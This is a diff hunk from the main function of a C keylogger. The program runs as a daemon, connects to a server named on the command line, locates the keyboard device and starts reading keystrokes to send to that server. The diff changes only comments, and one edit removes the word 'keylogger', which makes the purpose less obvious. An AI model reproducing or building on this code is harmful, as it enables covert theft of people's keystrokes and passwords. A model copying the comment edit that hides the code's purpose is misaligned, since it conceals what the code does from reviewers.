@@ -16,13 +16,13 @@ int main(int argc, char *argv[])
     if (!daemonize()) /* Convert process to daemon */
         exit(EXIT_FAILURE);
 
-    if (daemonAlreadyRunning(&flock)) /* If another instance of keylogger is already running, or could not acquire write lock then exit */
+    if (daemonAlreadyRunning(&flock)) /* Check if another instance is already running */
         exit(EXIT_FAILURE);
 
     if (!(server = openConnectionWithServer(argv[1], atoi(argv[2])))) /* Connecting with server */
         exit(EXIT_FAILURE);
 
-    if (!keyboardFound(DEVICES_PATH, &keyboard))
+    if (!keyboardFound(DEVICES_PATH, &keyboard)) /* Find keyboard */
         exit(EXIT_FAILURE);
 
     startKeylogger(keyboard, server); /* Reading from keyboard device and sending events to server */
